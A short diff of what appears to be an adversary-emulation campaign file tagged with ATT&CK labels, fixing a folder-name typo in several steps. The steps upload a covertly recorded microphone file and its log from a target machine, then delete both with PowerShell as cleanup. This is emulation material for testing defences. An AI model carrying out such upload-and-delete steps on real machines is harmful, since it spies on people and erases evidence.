@@ -311,19 +311,19 @@
             "30": {
                 "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
                 "module": "uploader",
-                "request": "--remotepath C:\\Users\\Public\\Document\\micaudio.log.txt",
+                "request": "--remotepath C:\\Users\\Public\\Documents\\micaudio.log.txt",
                 "type": "message"
             },
             "31": {
                 "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
                 "module": "uploader",
-                "request": "--remotepath C:\\Users\\Public\\Document\\micaudio.wav",
+                "request": "--remotepath C:\\Users\\Public\\Documents\\micaudio.wav",
                 "type": "message"
             },
             "32": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
-                "request": "powershell.exe del C:\\Users\\Public\\Document\\micaudio.log.txt",
+                "request": "powershell.exe del C:\\Users\\Public\\Documents\\micaudio.log.txt",
                 "rtags": [
                     "att&ck",
                     "cleanup"
@@ -333,7 +333,7 @@
             "33": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
-                "request": "powershell.exe del C:\\Users\\Public\\Document\\micaudio.wav",
+                "request": "powershell.exe del C:\\Users\\Public\\Documents\\micaudio.wav",
                 "rtags": [
                     "att&ck",
                     "cleanup"
